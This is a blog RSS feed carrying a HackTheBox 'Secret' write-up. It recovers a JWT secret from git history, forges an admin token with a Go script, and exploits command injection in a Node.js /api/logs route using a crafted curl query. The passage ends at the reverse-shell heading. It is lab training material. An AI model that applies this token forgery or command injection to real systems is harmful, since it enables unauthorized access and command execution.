<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>HackTheBox on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/hackthebox/</link>
    <description>Recent content in HackTheBox on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 19 May 2021 01:32:22 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/hackthebox/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Secret</title>
      <link>https://fahmifj.github.io/hackthebox/secret/</link>
      <pubDate>Wed, 28 Sep 2022 00:17:45 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/secret/</guid>
      <description>Secret starts with analyzing web source to recover a secret token from older commit. The secret is then used to forge JWT Admin token for accessing a private API route which is vulnerable to command injection and that eventually allows me to gain shell access on the system. For the root part, there&amp;rsquo;s a custom program with SUID bit that can be exploited by crashing it.
Skills Learned Forging JWT Command injection in API Abuse Core Dump with SUID Tools nmap JWT tool curl Reconnaissance Nmap Full TCP port scan with nmap discovers 3 open ports: SSH on its default port, HTTP on port 80 handled by NGINX, and another HTTP on port 3000 handled by Node.</description>
      <content:encoded><![CDATA[<p>Secret starts with analyzing web source to recover a secret token from older commit. The secret is then used to forge JWT Admin token for accessing a private API route which is vulnerable to command injection and that eventually allows me to gain shell access on the system. For the root part, there&rsquo;s a custom program with SUID bit that can be exploited by crashing it.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Forging JWT</li>
<li>Command injection in API</li>
<li>Abuse Core Dump with SUID</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>nmap</li>
<li>JWT tool</li>
<li>curl</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full TCP port scan with <code>nmap</code> discovers 3 open ports: SSH on its default port, HTTP on port 80 handled by NGINX, and another HTTP on port 3000 handled by Node.js.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «secret» «10.10.14.28» 
</span></span><span class="line"><span class="cl">$ fscan 10.10.11.120 secret
</span></span><span class="line"><span class="cl">nmap -p- 10.10.11.120 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
</span></span><span class="line"><span class="cl">nmap -p 22,80,3000 -sC -sV -oA nmap/all-tcp-ports-secret 10.10.11.120
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-30 23:20 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.120
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.073s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp   open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: DUMB Docs
</span></span><span class="line"><span class="cl">3000/tcp open  http    Node.js <span class="o">(</span>Express middleware<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: DUMB Docs
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 17.04 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the web on port 80 shows an online API documentation page called &ldquo;DUMBDocs&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20220926161011625.png" alt="image-20220926161011625"  /></div>
</p>
<p>The Live Demo button points to <code>/api/</code>, but it&rsquo;s a 404.</p>
<p><div class="img-container"><img src="imgs/image-20211031105210501.png" alt="image-20211031105210501"  /></div>
</p>
<p>At the bottom of the page, there&rsquo;s a button to download the API source code and I&rsquo;ll grab it.</p>
<p><div class="img-container"><img src="imgs/image-20211031104419915.png" alt="image-20211031104419915"  /></div>
</p>
<p>Clicking on any of the available card menus (introduction, installation, etc.) redirects to <code>/docs</code>, which in this section it explains how to use the API.</p>
<p><div class="img-container"><img src="imgs/image-20211031110930866.png" alt="image-20211031110930866"  /></div>
</p>
<p>Some sections contain <em>lorem ipsum</em> text, some are not. That should be the hint where to go further</p>
<h3 id="tcp-3000---website">TCP 3000 - Website</h3>
<p>On port 3000, it serves the same site as on port 80, but it served by <code>node.js</code> not <code>NGINX</code>.</p>
<p><div class="img-container"><img src="imgs/image-20211031110717336.png" alt="image-20211031110717336"  /></div>
</p>
<p>From here, I&rsquo;ll look into the API.</p>
<h3 id="api">API</h3>
<h4 id="register">Register</h4>
<p>According to the documentation (<code>/docs</code>), I can register a user by sending API request to <code>/api/user/register</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «secret» «10.10.14.28» 
</span></span><span class="line"><span class="cl">$ curl -H <span class="s1">&#39;Content-Type: application/json&#39;</span> -d <span class="s1">&#39;{&#34;name&#34;: &#34;syncrst&#34;,&#34;email&#34;: &#34;syncrst1@secret.com&#34;,&#34;password&#34;: &#34;syncrst&#34;}&#39;</span> http://secret.htb:3000/api/user/register
</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;user&#34;</span>:<span class="s2">&#34;syncrst&#34;</span><span class="o">}</span>
</span></span></code></pre></div><p>The response returns my username and that means the registration was successful.</p>
<h4 id="login---jwt-token">Login -&gt; JWT token</h4>
<p>Now that I&rsquo;ve been registered, I can login to get a <a href="https://jwt.io/introduction">JWT token</a> by sending API request to <code>/api/user/login</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «secret» «10.10.14.28» 
</span></span><span class="line"><span class="cl">$ curl -H <span class="s1">&#39;Content-Type: application/json&#39;</span> -d <span class="s1">&#39;{&#34;email&#34;: &#34;syncrst1@secret.com&#34;,&#34;password&#34;: &#34;syncrst&#34;}&#39;</span> http://secret.htb:3000/api/user/login 
</span></span><span class="line"><span class="cl">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzMxYzk5OGJkMDdlMGQ3YTU1ODcyOGYiLCJuYW1lIjoic3luY3JzdCIsImVtYWlsIjoic3luY3JzdDFAc2VjcmV0LmNvbSIsImlhdCI6MTY2NDIwNzU5OX0.VGfQxKW8DbdCCWGTeyEo6MAHhOkEqeaW-IBvyaik4oc
</span></span></code></pre></div><p>The payload data of this JWT can be seen with <a href="https://jwt.io">jwt.io</a>.</p>
<p><div class="img-container"><img src="imgs/image-20220927133742256.png" alt="image-20220927133742256"  /></div>
</p>
<h4 id="private-route">Private Route</h4>
<p>The last API route in this docs is <code>/api/priv</code>. I can use the auth token I got on this route, where it basically just checks for user role or privilege.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «secret» «10.10.14.28» 
</span></span><span class="line"><span class="cl">$ curl -sH <span class="s1">&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzMxYzk5OGJkMDdlMGQ3YTU1ODcyOGYiLCJuYW1lIjoic3luY3JzdCIsImVtYWlsIjoic3luY3JzdDFAc2VjcmV0LmNvbSIsImlhdCI6MTY2NDIwNzU5OX0.VGfQxKW8DbdCCWGTeyEo6MAHhOkEqeaW-IBvyaik4oc&#39;</span> http://secret.htb:3000/api/priv <span class="p">|</span> jq
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;role&#34;</span>: <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;role&#34;</span>: <span class="s2">&#34;you are normal user&#34;</span>,
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;desc&#34;</span>: <span class="s2">&#34;syncrst&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>It&rsquo;s still vague what to do with this API, so I&rsquo;ll look into the source code.</p>
<h3 id="source-code-analysis">Source Code Analysis</h3>
<h4 id="directory-structure">Directory Structure</h4>
<p>The source code has the typical structure of <code>node.js</code> application</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.28» 
</span></span><span class="line"><span class="cl">$ tree -L <span class="m">2</span> . 
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">├── files.zip
</span></span><span class="line"><span class="cl">└── local-web
</span></span><span class="line"><span class="cl">    ├── index.js
</span></span><span class="line"><span class="cl">    ├── model
</span></span><span class="line"><span class="cl">    ├── node_modules
</span></span><span class="line"><span class="cl">    ├── package.json
</span></span><span class="line"><span class="cl">    ├── package-lock.json
</span></span><span class="line"><span class="cl">    ├── public
</span></span><span class="line"><span class="cl">    ├── routes
</span></span><span class="line"><span class="cl">    ├── src
</span></span><span class="line"><span class="cl">    └── validations.js
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">7</span> directories, <span class="m">5</span> files
</span></span></code></pre></div><h4 id="commit-history">Commit History</h4>
<p>When I enter the <code>local-web</code> directory, my git plugin is activated, which indicates it contains git objects. It&rsquo;s worth to start with git first.</p>
<p>Running <code>git log</code> shows the commit history, author and email address.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «local-web» «10.10.14.28» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ git log 
</span></span><span class="line"><span class="cl">commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class="line"><span class="cl">Date:   Thu Sep <span class="m">9</span> 00:03:27 <span class="m">2021</span> +0530
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    now we can view logs from server 😃
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:30:17 <span class="m">2021</span> +0530
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    removed .env <span class="k">for</span> security reasons
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">commit de0a46b5107a2f4d26e348303e76d85ae4870934
</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:29:19 <span class="m">2021</span> +0530
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    added /downloads
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:27:35 <span class="m">2021</span> +0530
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    removed swap
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">commit 3a367e735ee76569664bf7754eaaade7c735d702
</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:26:39 <span class="m">2021</span> +0530
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    added downloads
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:25:52 <span class="m">2021</span> +0530
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    first commit
</span></span></code></pre></div><p>Commit <code>67d8da7</code> seems interesting. When comparing it with commit <code>de0a46b</code>, there&rsquo;s a deleted secret token.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «local-web» «10.10.14.28» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ git diff 67d8da7 de0a46b <span class="p">|</span> cat
</span></span><span class="line"><span class="cl">diff --git a/.env b/.env
</span></span><span class="line"><span class="cl">index 31db370..fb6f587 <span class="m">100644</span>
</span></span><span class="line"><span class="cl">--- a/.env
</span></span><span class="line"><span class="cl">+++ b/.env
</span></span><span class="line"><span class="cl">@@ -1,2 +1,2 @@
</span></span><span class="line"><span class="cl"> <span class="nv">DB_CONNECT</span> <span class="o">=</span> <span class="s1">&#39;mongodb://127.0.0.1:27017/auth-web&#39;</span>
</span></span><span class="line"><span class="cl">-TOKEN_SECRET <span class="o">=</span> secret
</span></span><span class="line"><span class="cl">+TOKEN_SECRET <span class="o">=</span> gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
</span></span></code></pre></div><p>I&rsquo;ll note that secret token.</p>
<h4 id="web-routes">Web Routes</h4>
<p>Looking at the <code>index.js</code> file, there are three defined routes: <code>privRoute</code>, <code>authRoute</code>, and <code>webroute</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">const <span class="nv">privRoute</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;./routes/private&#39;</span><span class="o">)</span> <span class="c1"># location: routes/private.js</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">// import routs 
</span></span><span class="line"><span class="cl">const <span class="nv">authRoute</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;./routes/auth&#39;</span><span class="o">)</span><span class="p">;</span> <span class="c1"># location: routes/auth.js</span>
</span></span><span class="line"><span class="cl">const <span class="nv">webroute</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;./src/routes/web&#39;</span><span class="o">)</span> <span class="c1"># location: src/routes/web.js</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">//middle ware 
</span></span><span class="line"><span class="cl">app.use<span class="o">(</span>express.json<span class="o">())</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">app.use<span class="o">(</span><span class="s1">&#39;/api/user&#39;</span>,authRoute<span class="o">)</span>
</span></span><span class="line"><span class="cl">app.use<span class="o">(</span><span class="s1">&#39;/api/&#39;</span>, privRoute<span class="o">)</span>
</span></span><span class="line"><span class="cl">app.use<span class="o">(</span><span class="s1">&#39;/&#39;</span>, webroute<span class="o">)</span>
</span></span></code></pre></div><p><code>webroute</code> is the router that handles the documentation web while <code>authRoute</code> is the router that handles the API  for user registration (<code>/api/user/register</code>) and login (<code>/api/user/login</code>) .</p>
<p>As for <code>privRoute</code>, it handles the API for private route (<code>/api/priv</code>). But, there&rsquo;s a hidden route <code>/api/logs</code> that wasn&rsquo;t listed in the API documentation. What&rsquo;s more interesting is that <code>/api/logs</code> route is vulnerable to command injection only if I pass the verification as user <code>theadmin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/logs&#39;</span><span class="p">,</span> <span class="nx">verifytoken</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">userinfo</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">name</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">userinfo</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">==</span> <span class="s1">&#39;theadmin&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">getLogs</span> <span class="o">=</span> <span class="sb">`git log --oneline </span><span class="si">${</span><span class="nx">file</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span> <span class="err">#</span> <span class="nx">command</span> <span class="nx">injection</span>
</span></span><span class="line"><span class="cl">        <span class="nx">exec</span><span class="p">(</span><span class="nx">getLogs</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span> <span class="p">,</span> <span class="nx">output</span><span class="p">)</span> <span class="p">=&gt;{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">output</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="nx">role</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">role</span><span class="o">:</span> <span class="s2">&#34;you are normal user&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nx">desc</span><span class="o">:</span> <span class="nx">userinfo</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">name</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-dasith">Shell as dasith</h3>
<h4 id="forging-admin-token">Forging Admin Token</h4>
<p>With the secret token obtained, I&rsquo;ll write a program to forge valid JWT token for user <code>theadmin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">jwt</span> <span class="s">&#34;github.com/dgrijalva/jwt-go&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">claims</span> <span class="o">:=</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">ID</span>    <span class="kt">string</span> <span class="s">`json:&#34;_id,omitempty&#34;`</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Name</span>  <span class="kt">string</span> <span class="s">`json:&#34;name,omitempty&#34;`</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Email</span> <span class="kt">string</span> <span class="s">`json:&#34;email,omitempty&#34;`</span>
</span></span><span class="line"><span class="cl">		<span class="nx">jwt</span><span class="p">.</span><span class="nx">StandardClaims</span>
</span></span><span class="line"><span class="cl">	<span class="p">}{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">ID</span><span class="p">:</span>    <span class="s">&#34;6114654d77f9a54e00f05777&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Name</span><span class="p">:</span>  <span class="s">&#34;theadmin&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Email</span><span class="p">:</span> <span class="s">&#34;root@dasith.works&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">token</span> <span class="o">:=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">NewWithClaims</span><span class="p">(</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">SigningMethodHS256</span><span class="p">,</span> <span class="nx">claims</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">secret</span> <span class="o">:=</span> <span class="s">&#34;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">signedToken</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">token</span><span class="p">.</span><span class="nf">SignedString</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">secret</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="nx">signedToken</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>I&rsquo;ll run the program to get the auth token.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
</span></span><span class="line"><span class="cl">$ go run forge-jwt.go
</span></span><span class="line"><span class="cl">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIn0.TKKattF_Exm2kXW4PQOo9jyrW0cMYuQkiQWP7DuhPn0
</span></span></code></pre></div><p>Now I can verify if that token works by accessing the <code>/api/priv</code> route</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
</span></span><span class="line"><span class="cl">$  curl -s -H <span class="s1">&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0&#39;</span> <span class="s2">&#34;http://secret.htb:3000/api/priv&#34;</span> <span class="p">|</span> jq
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;creds&#34;</span>: <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;role&#34;</span>: <span class="s2">&#34;admin&#34;</span>,
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span>: <span class="s2">&#34;theadmin&#34;</span>,
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;desc&#34;</span>: <span class="s2">&#34;welcome back admin,&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><h4 id="command-injection">Command Injection</h4>
<p>With admin token, I can access the <code>/api/logs</code> route.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/logs&#39;</span><span class="p">,</span> <span class="nx">verifytoken</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="nx">SNIP</span><span class="p">]...</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">==</span> <span class="s1">&#39;theadmin&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">getLogs</span> <span class="o">=</span> <span class="sb">`git log --oneline </span><span class="si">${</span><span class="nx">file</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">exec</span><span class="p">(</span><span class="nx">getLogs</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span> <span class="p">,</span> <span class="nx">output</span><span class="p">)</span> <span class="p">=&gt;{</span>
</span></span><span class="line"><span class="cl">     <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="k">return</span>
</span></span><span class="line"><span class="cl">     <span class="p">}</span>
</span></span><span class="line"><span class="cl">       <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">output</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="nx">SNIP</span><span class="p">]...</span>
</span></span></code></pre></div><p>This route takes one query: <code>file</code>, where its value then get passed into <code>getLogs</code> and eventually executed as OS command in the <code>exec()</code> function. Knowing this, I can inject OS command in the <code>file</code> query with <code>|</code> (pipe):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
</span></span><span class="line"><span class="cl">$ curl -s -H <span class="s1">&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0&#39;</span> <span class="s2">&#34;http://secret.htb:3000/api/logs?file=%3E%2fdev%2fnull|uname%20-a&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;Linux secret 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\n&#34;</span>
</span></span></code></pre></div><p>And that worked.</p>
<blockquote>
<p>the <code>&gt;</code> and <code>/</code> symbols are URL encoded.</p>
</blockquote>
<h4 id="reverse-shell">Reverse Shell</h4>
